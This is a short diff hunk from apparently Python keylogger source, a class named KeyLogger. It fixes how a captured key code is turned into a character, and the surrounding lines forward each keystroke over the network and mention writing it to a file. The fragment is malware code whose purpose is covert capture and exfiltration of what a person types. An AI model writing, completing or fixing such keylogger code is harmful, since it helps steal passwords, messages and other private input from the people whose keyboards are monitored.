@@ -87,7 +87,7 @@ class KeyLogger:
             if data:
                 key_code = data[2]  # The key code is in byte 2
                 try:
-                    char: str = self.keyboard_layout[str(key_code)] + key_code
+                    char: chr = chr(self.keyboard_layout[str(key_code)] + key_code)
                     try:
                         self.__forwarder.send_over_network(data=char)
                         # write data in file
